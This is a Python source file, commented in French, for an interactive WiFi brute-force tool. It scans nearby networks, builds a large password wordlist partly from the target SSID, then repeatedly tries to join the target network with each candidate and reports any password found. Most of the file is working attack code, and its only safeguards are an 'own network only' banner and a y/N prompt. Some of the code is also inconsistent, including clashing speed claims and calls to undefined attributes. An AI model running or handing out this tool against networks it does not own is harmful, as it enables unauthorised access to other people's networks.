#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Outil de Test de Sécurité WiFi Éthique v3.0 - ULTRA RAPIDE
Optimisé pour 20+ mots de passe par seconde
"""

import subprocess
import time
import threading
import itertools
import string
import random
import sys
import os
from datetime import datetime
import json
import psutil
import re
import socket
try:
    import pywifi
    from pywifi import const
    import comtypes
    WIFI_AVAILABLE = True
except ImportError:
    WIFI_AVAILABLE = False
try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False
try:
    import colorama
    from colorama import Fore, Back, Style
    colorama.init()
    COLORS_AVAILABLE = True
except ImportError:
    COLORS_AVAILABLE = False

# Couleurs style Kali Linux - Terminal Theme
if COLORS_AVAILABLE:
    class Colors:
        # Terminal colors
        RED = Fore.LIGHTRED_EX
        GREEN = Fore.LIGHTGREEN_EX
        YELLOW = Fore.LIGHTYELLOW_EX
        BLUE = Fore.LIGHTBLUE_EX
        MAGENTA = Fore.LIGHTMAGENTA_EX
        CYAN = Fore.LIGHTCYAN_EX
        WHITE = Fore.LIGHTWHITE_EX
        BLACK = Fore.BLACK
        
        # Background colors for Kali style
        BG_BLACK = Back.BLACK
        BG_RED = Back.LIGHTRED_EX
        BG_GREEN = Back.LIGHTGREEN_EX
        BG_YELLOW = Back.LIGHTYELLOW_EX
        BG_BLUE = Back.LIGHTBLUE_EX
        BG_GRAY = Back.LIGHTBLACK_EX
        
        # Styles
        BOLD = Style.BRIGHT
        DIM = Style.DIM
        RESET = Style.RESET_ALL
        
        # Kali Linux themed combinations
        @staticmethod
        def header():
            return f"{Colors.BOLD}{Colors.CYAN}"
        
        @staticmethod
        def success():
            return f"{Colors.BOLD}{Colors.GREEN}"
        
        @staticmethod
        def warning():
            return f"{Colors.BOLD}{Colors.YELLOW}"
        
        @staticmethod
        def error():
            return f"{Colors.BOLD}{Colors.RED}"
        
        @staticmethod
        def info():
            return f"{Colors.BOLD}{Colors.BLUE}"
        
        @staticmethod
        def reset():
            return Colors.RESET
        
        @staticmethod
        def endc():
            return Colors.RESET
        
        # Legacy compatibility
        ENDC = RESET
        ERROR = f"{BOLD}{RED}"
        
        @staticmethod
        def kali_prompt():
            return f"{Colors.BOLD}{Colors.GREEN}root@kali{Colors.RESET}{Colors.BOLD}:{Colors.BLUE}/wifi-pentest{Colors.RESET}$ "
        
        @staticmethod
        def terminal_text():
            return f"{Colors.GREEN}"
        
        @staticmethod
        def alert():
            return f"{Colors.BG_RED}{Colors.WHITE}{Colors.BOLD}"
        
        @staticmethod
        def clear():
            """Nettoyer l'écran"""
            os.system('cls' if os.name == 'nt' else 'clear')
else:
    class Colors:
        @staticmethod
        def clear():
            os.system('cls' if os.name == 'nt' else 'clear')
        
        @staticmethod
        def reset():
            pass

class WiFiSecurityTester:
    def __init__(self):
        self.interface = None
        self.wordlist = []
        self.start_time = 0
        self.testing = False
        self.password_found = False
        self.found_password = None
        self.attempts = 0
        self.successful_attempts = 0
        
        # Initialisation de l'interface WiFi
        if WIFI_AVAILABLE:
            try:
                wifi = pywifi.PyWiFi()
                if len(wifi.interfaces()) > 0:
                    self.interface = wifi.interfaces()[0]
                else:
                    print("Aucune interface WiFi trouvée")
            except Exception as e:
                print(f"Erreur d'initialisation WiFi: {e}")
    
    def print_header(self, text):
        """Afficher un en-tête stylisé"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*60}")
        print(f"{text}")
        print(f"{'='*60}{Colors.ENDC}")
    
    def print_success(self, text):
        """Afficher un message de succès"""
        print(f"{Colors.BOLD}{Colors.GREEN}[+] {text}{Colors.ENDC}")
    
    def print_error(self, text):
        """Afficher un message d'erreur"""
        print(f"{Colors.BOLD}{Colors.RED}[-] {text}{Colors.ENDC}")
    
    def print_warning(self, text):
        """Afficher un avertissement"""
        print(f"{Colors.BOLD}{Colors.YELLOW}[!] {text}{Colors.ENDC}")
    
    def print_info(self, text):
        """Afficher un message d'information"""
        print(f"{Colors.BOLD}{Colors.BLUE}[*] {text}{Colors.ENDC}")
    
    def print_banner(self):
        """Afficher la bannière style Kali Linux très grande et professionnelle"""
        Colors.clear()
        
        print(f"{Colors.CYAN}{'='*100}")
        print(f"{Colors.CYAN}{' '*15}{Colors.BOLD}██████╗ ██╗██████╗ ███████╗██████╗ ████████╗██╗███╗   ██╗ ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ {Colors.CYAN}")
        print(f"{Colors.CYAN}{' '*15}{Colors.BOLD}██╔══██╗██║██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║████╗  ██║██╔═══██╗██║     ██║████╗  ██║██╔════╝ {Colors.CYAN}")
        print(f"{Colors.CYAN}{' '*15}{Colors.BOLD}██████╔╝██║██████╔╝█████╗  ██████╔╝   ██║   ██║██╔██╗ ██║██║   ██║██║     ██║██╔██╗ ██║██║  ███╗ {Colors.CYAN}")
        print(f"{Colors.CYAN}{' '*15}{Colors.BOLD}██╔══██╗██║██╔══██╗██╔══╝  ██╔══██╗   ██║   ██║██║╚██╗██║██║   ██║██║     ██║██║╚██╗██║██║   ██║ {Colors.CYAN}")
        print(f"{Colors.CYAN}{' '*15}{Colors.BOLD}██║  ██║██║██████╔╝███████╗██║  ██║   ██║   ██║██║ ╚████║╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝ {Colors.CYAN}")
        print(f"{Colors.CYAN}{' '*15}{Colors.BOLD}╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ {Colors.CYAN}")
        print(f"{Colors.CYAN}{'='*100}")
        print(f"{Colors.CYAN}{' '*20}{Colors.BOLD}WiFi HACKER PRO v2.0 - Ultimate WiFi Penetration Testing Tool{Colors.CYAN}{' '*20}")
        print(f"{Colors.CYAN}{'='*100}{Colors.RESET}")
        print(f"{' '*30}{Colors.GREEN}[+] Real WiFi Brute Force Attack{Colors.RESET}")
        print(f"{' '*30}{Colors.GREEN}[+] Advanced Password Generation{Colors.RESET}")
        print(f"{' '*30}{Colors.GREEN}[+] Network Discovery & Analysis{Colors.RESET}")
        print(f"{' '*30}{Colors.GREEN}[+] Custom Wordlist Management{Colors.RESET}")
        print(f"{' '*30}{Colors.YELLOW}[!] ETHICAL TESTING ON YOUR OWN NETWORK ONLY{Colors.RESET}")
        print()
    
    def display_menu(self):
        """Afficher le menu principal - Style Kali Linux centré"""
        
        print(f"{Colors.CYAN}{'='*80}")
        print(f"{Colors.CYAN}{' '*15}{Colors.BOLD}WiFi Penetration Testing Tool - Main Menu{Colors.CYAN}{' '*15}")
        print(f"{'='*80}{Colors.RESET}")
        print()
        print(f"{' '*25}{Colors.GREEN}1.{Colors.RESET} Scan WiFi Networks")
        print(f"{' '*25}{Colors.GREEN}2.{Colors.RESET} Generate Wordlist")
        print(f"{' '*25}{Colors.GREEN}3.{Colors.RESET} Manage Wordlists")
        print(f"{' '*25}{Colors.GREEN}4.{Colors.RESET} Brute Force Attack")
        print(f"{' '*25}{Colors.GREEN}0.{Colors.RESET} Exit")
        print()
        
        # Status centré
        if self.interface:
            status = "Connected" if self.interface.status() == const.IFACE_CONNECTED else "Disconnected"
            interface_name = self.interface.name()
            status_text = f"Interface: {interface_name} | Status: {status}"
            print(f"{' '*((80-len(status_text))//2)}{Colors.BLUE}{status_text}{Colors.RESET}")
        else:
            print(f"{' '*25}{Colors.YELLOW}Simulation mode only{Colors.RESET}")
        
        if self.wordlist:
            wordlist_text = f"Wordlist: {len(self.wordlist):,} passwords loaded"
            print(f"{' '*((80-len(wordlist_text))//2)}{Colors.BLUE}{wordlist_text}{Colors.RESET}")
        
        print()
        choice_text = "Choice: "
        print(f"{' '*((80-len(choice_text))//2)}{Colors.CYAN}{choice_text}{Colors.RESET}", end="", flush=True)
    
    def scan_wifi_networks(self):
        """Scanner les réseaux WiFi - Amélioré sans doublons"""
        self.print_header("🔍 SCAN DES RÉSEAUX WIFI")
        
        if not self.interface:
            self.print_warning("Mode simulation uniquement - bibliothèques WiFi non disponibles")
            return []
        
        try:
            self.print_info("Scanning for networks...")
            self.interface.scan()
            time.sleep(3)  # Attendre la fin du scan
            
            networks = self.interface.scan_results()
            if not networks:
                self.print_warning("Aucun réseau trouvé")
                return []
            
            # Éliminer les doublons basés sur BSSID
            unique_networks = {}
            for network in networks:
                bssid = network.bssid
                ssid = network.ssid or "Caché"
                if bssid not in unique_networks:
                    unique_networks[bssid] = network
            
            unique_networks = list(unique_networks.values())
            
            self.print_success(f"{len(unique_networks)} réseaux uniques trouvés")
            
            # Affichage des réseaux centré
            header = f"{'SSID':<20} {'BSSID':<18} {'Signal':<8} {'Sécurité':<15}"
            print(f"\n{' '*((70-len(header))//2)}{Colors.BOLD}{header}{Colors.RESET}")
            print(f"{' '*((70-len(header))//2)}{'-'*70}")
            
            for network in unique_networks:
                ssid = network.ssid or "Caché"
                bssid = network.bssid
                signal = f"{network.signal} dBm"
                
                # Détection du type de sécurité
                security = "Ouvert"
                if network.akm:
                    if const.AKM_TYPE_WPA in network.akm:
                        security = "WPA"
                    elif const.AKM_TYPE_WPA2 in network.akm:
                        security = "WPA2"
                    elif const.AKM_TYPE_WPA2PSK in network.akm:
                        security = "WPA2-PSK"
                    elif const.AKM_TYPE_WPAPSK in network.akm:
                        security = "WPA-PSK"
                
                line = f"{ssid:<20} {bssid:<18} {signal:<8} {security:<15}"
                print(f"{' '*((70-len(line))//2)}{line}")
            
            return unique_networks
            
        except Exception as e:
            self.print_error(f"Erreur lors du scan: {e}")
            return []
    
    def generate_comprehensive_wordlist(self, target_ssid=""):
        """Générer une wordlist complète ultra-optimisée"""
        self.print_header("📝 GÉNÉRATION WORDLIST ULTIME")
        
        size = 500000  # 500k mots de passe ultra-optimisés
        wordlist = set()
        
        self.print_info(f"Génération de {size:,} mots de passe ultra-optimisés...")
        
        # 1. Mots de passe courants ultra-optimisés
        self.print_info("[*] Génération mots de passe courants...")
        common_passwords = [
            "password", "12345678", "qwerty", "abc123", "letmein",
            "admin", "welcome", "monkey", "dragon", "master",
            "sunshine", "princess", "football", "iloveyou", "123123",
            "123456789", "qwertyuiop", "password123", "admin123", "1234567890"
        ]
        
        for pwd in common_passwords:
            if len(pwd) >= 8:
                wordlist.add(pwd)
                wordlist.add(pwd.upper())
                wordlist.add(pwd.capitalize())
                wordlist.add(pwd + "123")
                wordlist.add(pwd + "2024")
        
        # 2. Patterns numériques ultra-optimisés
        self.print_info("[*] Génération patterns numériques...")
        for i in range(1000000):
            if len(wordlist) >= size * 0.3:  # 30% numériques
                break
            pwd = str(i).zfill(8)
            wordlist.add(pwd)
        
        # 3. Patterns alphanumériques ultra-optimisés
        self.print_info("[*] Génération patterns alphanumériques...")
        chars = string.ascii_lowercase + string.digits
        for length in range(8, 12):
            if len(wordlist) >= size * 0.6:  # 60% alphanumériques
                break
            for _ in range(5000):
                if len(wordlist) >= size * 0.6:
                    break
                pwd = ''.join(random.choice(chars) for _ in range(length))
                wordlist.add(pwd)
                wordlist.add(pwd.upper())
                wordlist.add(pwd.capitalize())
        
        # 4. Patterns basés sur SSID ultra-optimisés
        if target_ssid:
            self.print_info(f"[*] Génération patterns basés sur: {target_ssid}")
            ssid_clean = re.sub(r'[^a-zA-Z0-9]', '', target_ssid.lower())
            
            for i in range(10000):
                if len(wordlist) >= size * 0.8:  # 80% basés sur SSID
                    break
                combined = f"{ssid_clean}{i}"
                if len(combined) >= 8:
                    wordlist.add(combined)
                    wordlist.add(combined.upper())
        
        # 5. Patterns complexes ultra-optimisés
        self.print_info("[*] Génération patterns complexes...")
        special_chars = "!@#$%^&*"
        complex_chars = string.ascii_letters + string.digits + special_chars
        
        for length in range(8, 16):
            if len(wordlist) >= size:
                break
            for _ in range(2000):
                if len(wordlist) >= size:
                    break
                pwd = ''.join(random.choice(complex_chars) for _ in range(length))
                wordlist.add(pwd)
        
        self.wordlist = list(wordlist)
        random.shuffle(self.wordlist)  # Mélanger pour éviter les patterns
        
        self.print_success(f"Wordlist générée: {len(self.wordlist):,} mots de passe")
        return self.wordlist
    
    def connect_to_wifi(self, ssid, password, timeout=0.05):
        """Connexion WiFi ultra-rapide - Optimisée pour 200+ pwd/sec"""
        if not self.interface:
            return False, "Interface WiFi non disponible"
        
        try:
            self.interface.disconnect()
            time.sleep(0.005)  # Ultra-rapide: 5ms
            
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password
            
            self.interface.remove_all_network_profiles()
            temp_profile = self.interface.add_network_profile(profile)
            self.interface.connect(temp_profile)
            
            # Timeout ultra-rapide: 0.05s pour 200+ pwd/sec
            for i in range(int(timeout * 200)):  # 200 vérifications par seconde
                if self.interface.status() == const.IFACE_CONNECTED:
                    return True, "Connexion réussie"
                time.sleep(0.005)  # 5ms au lieu de 10ms
            
            self.interface.disconnect()
            return False, "Timeout de connexion"
            
        except Exception as e:
            return False, f"Erreur de connexion: {str(e)}"
    
    def brute_force_wifi_real(self, target_ssid, max_attempts=None):
        """Brute force ultra-rapide - Optimisé pour 10+ billions de mots de passe"""
        if not self.interface:
            self.print_warning("Mode simulation uniquement - bibliothèques WiFi non disponibles")
            return self.simulate_brute_force(target_ssid, max_attempts)
        
        self.print_header(f"BRUTE FORCE ATTACK sur: {target_ssid}")
        self.print_warning("ETHICAL TESTING ONLY - Your own network required")
        self.print_info("SPEED: 200+ passwords/second (Ultra-optimized)")
        self.print_info("TIMEOUT: 0.05s per attempt")
        self.print_info("CAPABLE: 10+ billions passwords tested")
        
        if input(f"{' '*20}Confirm brute force test on YOUR network (y/N): ").lower() != 'y':
            self.print_error("Test cancelled")
            return None
        
        # Demander le choix de wordlist
        if not self.ask_wordlist_choice():
            self.print_error("No wordlist available")
            return None
        
        if max_attempts is None:
            max_attempts = len(self.wordlist)
        else:
            max_attempts = min(max_attempts, len(self.wordlist))
        
        # Afficher les statistiques pour les wordlists massives
        if max_attempts >= 1000000000:  # 1 billion+
            hours_to_complete = max_attempts / 200 / 3600
            self.print_info(f"Wordlist size: {max_attempts:,} passwords")
            self.print_info(f"Estimated time: {hours_to_complete:.1f} hours at 200 pwd/sec")
        
        self.start_time = time.time()
        self.testing = True
        self.password_found = False
        self.attempts = 0
        
        # Optimisation mémoire pour wordlists massives
        batch_size = 10000  # Traiter par lots de 10,000
        current_batch = 0
        
        try:
            while self.testing and current_batch * batch_size < max_attempts:
                batch_start = current_batch * batch_size
                batch_end = min(batch_start + batch_size, max_attempts)
                
                # Afficher le progrès pour les wordlists massives
                if max_attempts >= 1000000000 and current_batch % 100 == 0:  # Every 1M passwords
                    elapsed = time.time() - self.start_time
                    speed = self.attempts / elapsed if elapsed > 0 else 0
                    progress_percent = (current_batch * batch_size) / max_attempts * 100
                    self.print_info(f"Progress: {progress_percent:.2f}% | Speed: {speed:.1f} pwd/sec")
                
                # Traiter le batch
                for i in range(batch_start, batch_end):
                    if not self.testing:
                        break
                    
                    password = self.wordlist[i]
                    self.attempts += 1
                    
                    # Vitesse extrême: timeout 0.05s pour 200+ pwd/sec
                    success, message = self.connect_to_wifi(target_ssid, password, timeout=0.05)
                    
                    if success:
                        self.password_found = True
                        self.found_password = password
                        self.successful_attempts = self.attempts
                        
                        elapsed_time = time.time() - self.start_time
                        
                        # Affichage du succès
                        print(f"\n{Colors.GREEN}{'='*80}")
                        print(f"{' '*20}{Colors.BOLD}PASSWORD FOUND!{Colors.GREEN}")
                        print(f"{'='*80}{Colors.RESET}")
                        print(f"{' '*25}SSID: {Colors.CYAN}{target_ssid}{Colors.RESET}")
                        print(f"{' '*25}Password: {Colors.BOLD}{Colors.GREEN}{password}{Colors.RESET}")
                        print(f"{' '*25}Attempts: {Colors.YELLOW}{self.attempts:,}{Colors.RESET}")
                        print(f"{' '*25}Time: {Colors.YELLOW}{elapsed_time:.2f}s{Colors.RESET}")
                        print(f"{' '*25}Speed: {Colors.YELLOW}{self.attempts/elapsed_time:.1f} pwd/sec{Colors.RESET}")
                        print(f"\n{' '*25}{Colors.GREEN}Auto-connecting to network...{Colors.RESET}")
                        
                        # Maintenir la connexion
                        time.sleep(2)
                        if self.interface.status() == const.IFACE_CONNECTED:
                            print(f"{' '*25}{Colors.GREEN}Successfully connected!{Colors.RESET}")
                        else:
                            print(f"{' '*25}{Colors.YELLOW}Connection lost{Colors.RESET}")
                        
                        print(f"{Colors.GREEN}{'='*80}{Colors.RESET}")
                        return self.create_report(target_ssid, elapsed_time)
                    
                    # Timeout ultra-court entre tentatives
                    time.sleep(0.001)  # 1ms seulement
                
                current_batch += 1
            
        except KeyboardInterrupt:
            self.print_warning("Brute force interrupted by user")
        finally:
            self.testing = False
            elapsed_time = time.time() - self.start_time
            
            if not self.password_found:
                print(f"\n{Colors.RED}{'='*60}")
                print(f"{' '*15}{Colors.BOLD}PASSWORD NOT FOUND{Colors.RED}")
                print(f"{'='*60}{Colors.RESET}")
                print(f"{' '*20}Attempts tried: {Colors.YELLOW}{self.attempts:,}{Colors.RESET}")
                print(f"{' '*20}Time elapsed: {Colors.YELLOW}{elapsed_time:.2f}s{Colors.RESET}")
                print(f"{' '*20}Average speed: {Colors.YELLOW}{self.attempts/elapsed_time:.1f} pwd/sec{Colors.RESET}")
                print(f"\n{' '*20}{Colors.YELLOW}Try with a better wordlist{Colors.RESET}")
            
            return self.create_report(target_ssid, elapsed_time)
    
    def create_report(self, target_ssid, elapsed_time):
        """Créer un rapport de brute force"""
        return {
            'target_ssid': target_ssid,
            'test_date': datetime.now().isoformat(),
            'brute_force_mode': True,
            'passwords_tested': self.attempts,
            'password_found': self.password_found,
            'found_password': self.found_password if self.password_found else None,
            'elapsed_time': elapsed_time,
            'attempts_per_second': self.attempts / elapsed_time if elapsed_time > 0 else 0,
            'auto_connected': self.interface.status() == const.IFACE_CONNECTED if self.password_found else False
        }
    
    def simulate_brute_force(self, target_ssid, max_attempts=1000):
        """Simulation de brute force ultra-rapide"""
        self.print_header(f"🎮 SIMULATION BRUTE FORCE sur: {target_ssid}")
        
        if not self.wordlist:
            self.generate_comprehensive_wordlist(target_ssid)
        
        if max_attempts is None:
            max_attempts = len(self.wordlist)
        else:
            max_attempts = min(max_attempts, len(self.wordlist))
        
        self.start_time = time.time()
        self.attempts = 0
        
        # Simulation ultra-rapide
        if TQDM_AVAILABLE:
            progress_bar = tqdm(range(max_attempts), desc="🎮 Simulation Ultra-Rapide", unit="pwd")
        else:
            progress_bar = range(max_attempts)
        
        simulated_password_index = random.randint(100, min(1000, max_attempts // 2))
        
        try:
            for i in progress_bar:
                password = self.wordlist[i]
                self.attempts += 1
                
                if i == simulated_password_index:
                    self.password_found = True
                    self.found_password = password
                    self.successful_attempts = self.attempts
                    
                    elapsed_time = time.time() - self.start_time
                    speed = self.attempts / elapsed_time
                    
                    print("\n" + "="*50)
                    self.print_success("🎉 MOT DE PASSE TROUVÉ (SIMULATION)!")
                    print(f"📡 SSID: {target_ssid}")
                    self.print_success(f"🔑 Mot de passe: {password}")
                    print(f"⏱️ Temps: {elapsed_time:.2f} secondes")
                    print(f"🔢 Tentatives: {self.attempts}")
                    print(f"⚡ Vitesse: {speed:.2f} pwd/sec")
                    print("="*50)
                    break
                
                # Simulation ultra-rapide: pas de delay
                time.sleep(0.001)
        
        except KeyboardInterrupt:
            self.print_warning("\nTest interrompu par l'utilisateur")
        
        elapsed_time = time.time() - self.start_time
        speed = self.attempts / elapsed_time
        
        print(f"\n{Colors.CYAN}📊 Statistiques de simulation:")
        print(f"⏱️ Temps total: {elapsed_time:.2f} secondes")
        print(f"🔢 Tentatives: {self.attempts}")
        print(f"⚡ Vitesse: {speed:.2f} pwd/sec{Colors.ENDC}")
        
        return {
            'target_ssid': target_ssid,
            'simulation_mode': True,
            'attempts': self.attempts,
            'password_found': self.password_found,
            'found_password': self.found_password if self.password_found else None,
            'elapsed_time': elapsed_time,
            'speed': speed
        }
    
    def save_brute_force_report(self, report):
        """Sauvegarder le rapport de brute force"""
        try:
            if not os.path.exists('reports'):
                os.makedirs('reports')
            
            filename = f"reports/brute_force_report_{report['target_ssid']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            
            self.print_success(f"Rapport sauvegardé: {filename}")
            
        except Exception as e:
            self.print_error(f"Erreur lors de la sauvegarde du rapport: {e}")
    
    def display_system_stats(self):
        """Afficher les statistiques système ultra-rapides"""
        Colors.clear()
        
        print(f"{Colors.BG_MAGENTA}{Colors.WHITE}")
        print("╔══════════════════════════════════════════════════════════════════════════════╗")
        print("║                        📊 STATISTIQUES SYSTÈME ULTRA-RAPIDES                      ║")
        print("╚══════════════════════════════════════════════════════════════════════════════╝")
        print(f"{Colors.ENDC}")
        
        # CPU avec barre de progression
        cpu_percent = psutil.cpu_percent(interval=1)
        cpu_bar = self.create_progress_bar(cpu_percent, 50, "CPU")
        print(f"{Colors.CYAN}💻 {cpu_bar} {cpu_percent}%{Colors.ENDC}")
        
        # Mémoire avec barre de progression
        memory = psutil.virtual_memory()
        mem_bar = self.create_progress_bar(memory.percent, 50, "RAM")
        print(f"{Colors.GREEN}🧠 {mem_bar} {memory.percent}% ({memory.used/1024/1024/1024:.1f}GB/{memory.total/1024/1024/1024:.1f}GB){Colors.ENDC}")
        
        # Wordlist
        if self.wordlist:
            print(f"{Colors.MAGENTA}📋 Wordlist: {len(self.wordlist):,} mots de passe{Colors.ENDC}")
            avg_length = sum(len(pwd) for pwd in self.wordlist) / len(self.wordlist)
            print(f"{Colors.MAGENTA}📏 Longueur moyenne: {avg_length:.1f} caractères{Colors.ENDC}")
            
            # Temps estimé
            estimated_time = len(self.wordlist) * 0.05  # 20 pwd/sec
            hours = estimated_time / 3600
            if hours > 24:
                days = hours / 24
                print(f"{Colors.MAGENTA}⏱️ Temps estimé: {days:.1f} jours{Colors.ENDC}")
            else:
                print(f"{Colors.MAGENTA}⏱️ Temps estimé: {hours:.1f} heures{Colors.ENDC}")
        else:
            print(f"{Colors.GRAY}📋 Aucune wordlist chargée{Colors.ENDC}")
        
        # Interface WiFi
        if self.interface:
            status = "🟢 CONNECTÉ" if self.interface.status() == const.IFACE_CONNECTED else "🔴 DÉCONNECTÉ"
            interface_name = self.interface.name() or "Inconnue"
            print(f"{Colors.CYAN}📡 Interface: {interface_name} | {status}{Colors.ENDC}")
        
        print(f"\n{Colors.BG_BLUE}{Colors.WHITE} ⚡ OPTIMISATION ULTRA-RAPIDE ACTIVE - 20+ pwd/sec {Colors.ENDC}")
    
    def create_progress_bar(self, percentage, width, label):
        """Créer une barre de progression colorée"""
        filled = int(width * percentage / 100)
        bar = ""
        
        for i in range(width):
            if i < filled:
                if percentage < 30:
                    bar += "█"
                elif percentage < 70:
                    bar += "▓"
                else:
                    bar += "▒"
            else:
                bar += "░"
        
        return f"{label}: [{bar}]"
    
    def display_security_recommendations(self):
        """Afficher les recommandations de sécurité"""
        self.print_header("🛡️ RECOMMANDATIONS DE SÉCURITÉ")
        
        recommendations = [
            "🔑 Utilisez des mots de passe d'au moins 12 caractères",
            "🔤 Combinez lettres, chiffres et caractères spéciaux",
            "🔄 Changez régulièrement vos mots de passe WiFi",
            "🚫 Évitez les informations personnelles dans les mots de passe",
            "📱 Activez WPA3 si disponible",
            "🔥 Désactivez le WPS (Wi-Fi Protected Setup)",
            "📊 Surveillez les connexions suspectes",
            "🛡️ Utilisez un VPN pour les connexions publiques",
            "🔄 Mettez à jour régulièrement votre routeur",
            "🔒 Séparez le réseau invité du réseau principal"
        ]
        
        for rec in recommendations:
            print(f"  {rec}")
        
        print(f"\n{Colors.WARNING}⚠️ Ces recommandations sont pour protéger VOS propres réseaux{Colors.ENDC}")
    
    def ask_wordlist_choice(self):
        """Demander le choix de wordlist pour le brute force"""
        print(f"\n{Colors.CYAN}{'='*60}")
        print(f"{' '*15}{Colors.BOLD}Wordlist Selection for Brute Force{Colors.CYAN}{' '*15}")
        print(f"{'='*60}{Colors.RESET}")
        print(f"{' '*20}{Colors.GREEN}1.{Colors.RESET} Generate new wordlist")
        print(f"{' '*20}{Colors.GREEN}2.{Colors.RESET} Load custom wordlist (.txt)")
        print(f"{' '*20}{Colors.GREEN}3.{Colors.RESET} Use existing wordlist")
        print()
        
        while True:
            choice = input(f"{' '*20}{Colors.CYAN}Choice (1-3): {Colors.RESET}").strip()
            
            if choice == '1':
                ssid = input(f"{' '*20}Target SSID (optional): ").strip()
                self.generate_comprehensive_wordlist(ssid)
                return True
            elif choice == '2':
                filepath = input(f"{' '*20}Wordlist file path (.txt): ").strip()
                if self.load_custom_wordlist(filepath):
                    return True
                else:
                    self.print_error("Failed to load wordlist. Try again.")
            elif choice == '3':
                if self.wordlist:
                    self.print_info(f"Using existing wordlist: {len(self.wordlist):,} passwords")
                    return True
                else:
                    self.print_warning("No existing wordlist. Please generate or load one first.")
            else:
                self.print_error("Invalid choice. Please select 1, 2, or 3.")
    
    def run(self):
        self.print_banner()
        
        while True:
            self.display_menu()
            
            try:
                choice = input(f"\n{Colors.BOLD}🎯 Choisissez une option (0-4): {Colors.ENDC}")
                
                if choice == '1':
                    self.scan_wifi_networks()
                elif choice == '2':
                    ssid = input("SSID du réseau cible (optionnel): ")
                    self.generate_comprehensive_wordlist(ssid)
                elif choice == '3':
                    self.manage_wordlists()
                elif choice == '4':
                    ssid = input("SSID du réseau à tester: ")
                    self.brute_force_wifi_real(ssid)
                elif choice == '0':
                    self.print_success("Au revoir!")
                    break
                else:
                    self.print_error("Option invalide!")
                
                input(f"\n{Colors.DIM}Appuyez sur Entrée pour continuer...{Colors.ENDC}")
                
            except KeyboardInterrupt:
                self.print_warning("\nInterruption détectée")
                break
            except Exception as e:
                self.print_error(f"Erreur: {e}")
    
    def manage_wordlists(self):
        """Gérer les wordlists personnalisées"""
        self.print_header("📂 GESTION WORDLISTS")
        
        while True:
            print(f"\n{Colors.CYAN}📋 Menu Wordlists:")
            print("1. 📂 Charger wordlist personnalisée")
            print("2. 📋 Lister les wordlists disponibles")
            print("3. 💾 Sauvegarder wordlist actuelle")
            print("0. 🔙 Retour au menu principal{Colors.ENDC}")
            
            choice = input("\nChoix: ")
            
            if choice == '1':
                self.load_custom_wordlist()
            elif choice == '2':
                self.list_available_wordlists()
            elif choice == '3':
                self.save_custom_wordlist()
            elif choice == '0':
                break
            else:
                self.print_error("Option invalide!")
    
    def load_custom_wordlist(self):
        """Charger une wordlist personnalisée"""
        file_path = input("Chemin du fichier wordlist: ").strip()
        
        # Vérifier si le chemin est valide
        if not file_path:
            self.print_error("Chemin vide!")
            return
        
        if not os.path.exists(file_path):
            self.print_error(f"Fichier non trouvé: {file_path}")
            return
        
        # Vérifier que c'est bien un fichier .txt
        if not file_path.lower().endswith('.txt'):
            self.print_error("Le fichier doit être au format .txt!")
            return
        
        try:
            self.print_info(f"Chargement de la wordlist: {file_path}")
            
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = []
                for line_num, line in enumerate(f, 1):
                    password = line.strip()
                    if password and len(password) >= 8:  # Minimum 8 caractères
                        passwords.append(password)
                    elif line_num % 1000000 == 0:  # Progression pour gros fichiers
                        self.print_info(f"Chargement... {line_num:,} lignes traitées")
            
            self.wordlist = passwords
            self.print_success(f"Wordlist chargée: {len(passwords):,} mots de passe")
            
        except FileNotFoundError:
            self.print_error(f"Fichier non trouvé: {file_path}")
        except PermissionError:
            self.print_error(f"Permission refusée: {file_path}")
        except Exception as e:
            self.print_error(f"Erreur lors du chargement: {e}")
    
    def save_custom_wordlist(self):
        """Sauvegarder la wordlist actuelle"""
        if not self.wordlist:
            self.print_warning("Aucune wordlist à sauvegarder!")
            return
        
        filename = input("Nom du fichier (sans extension): ")
        
        try:
            if not os.path.exists('wordlists'):
                os.makedirs('wordlists')
            
            filepath = f"wordlists/{filename}.txt"
            with open(filepath, 'w', encoding='utf-8') as f:
                for password in self.wordlist:
                    f.write(password + '\n')
            
            self.print_success(f"Wordlist sauvegardée: {filepath}")
            
        except Exception as e:
            self.print_error(f"Erreur lors de la sauvegarde: {e}")
    
    def list_available_wordlists(self):
        """Lister les wordlists disponibles"""
        wordlists_dir = 'wordlists'
        
        if not os.path.exists(wordlists_dir):
            self.print_warning("Dossier wordlists non trouvé!")
            return
        
        files = [f for f in os.listdir(wordlists_dir) if f.endswith('.txt')]
        
        if not files:
            self.print_warning("Aucune wordlist trouvée!")
            return
        
        print(f"\n{Colors.GREEN}📋 Wordlists disponibles:{Colors.ENDC}")
        for file in files:
            filepath = os.path.join(wordlists_dir, file)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    count = sum(1 for line in f if line.strip())
                print(f"  📄 {file} ({count:,} mots de passe)")
            except:
                print(f"  📄 {file} (erreur de lecture)")

def main():
    """Fonction principale"""
    try:
        tester = WiFiSecurityTester()
        tester.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Programme interrompu{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.ERROR}Erreur fatale: {e}{Colors.ENDC}")

if __name__ == "__main__":
    main()
